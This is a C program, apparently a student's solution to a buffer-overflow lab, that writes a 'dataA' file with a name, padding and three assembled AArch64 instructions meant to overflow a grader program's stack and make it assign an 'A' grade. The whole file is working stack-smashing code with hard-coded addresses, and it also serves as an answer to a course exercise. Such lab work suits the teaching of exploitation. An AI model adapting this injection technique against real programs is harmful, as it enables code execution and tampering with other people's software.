/*
 * Produces dataA file that contains student name, null byte, 
 * and padding to perform stack smashing. 
 */

#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include "miniassembler.h"

/*
 * main function writes to "dataA" file to perform stack smashing,
 * causing the grader program to assign the A grade. 
 */
int main() {
    FILE *file; 
    unsigned int MOV, STRB, B; 

    file = fopen("dataA", "wb");
    if (!file) {
        perror("Unable to open file");
        return 1;
    }

    /* write name and null terminator to file. 
    grader program will ... */ 
    fwrite("Claire Shin", 1, 11, file);
    fputc('\0', file);

    /* add padding so that buffer overflow can be performed 
    48 - 11 (length of name)= 37. */ 
    for (int i = 0; i < 37; i++) {
        fputc('A', file);
    }

    /* MOV grade A to register W0 using MiniAssembler */
    MOV = MiniAssembler_mov(0, 'A');
    fwrite(&MOV, sizeof(unsigned int), 1, file);

    /* STR content of register W0 into the address pointed by X1
    branch back to normal program flow after setting grade to A */
    STRB = MiniAssembler_strb(0, 1);
    fwrite(&STRB, sizeof(unsigned int), 1, file);

    /* B back to return address */ 
    /* 0x40087c is instruction address after getName returns
    0xffffffffea20 is the injected instruction address based on gdb */
    B = MiniAssembler_b(0x40087c, 0xffffffffea20);
    fwrite(&B, sizeof(unsigned int), 1, file);

    fclose(file);
    return 0;

}
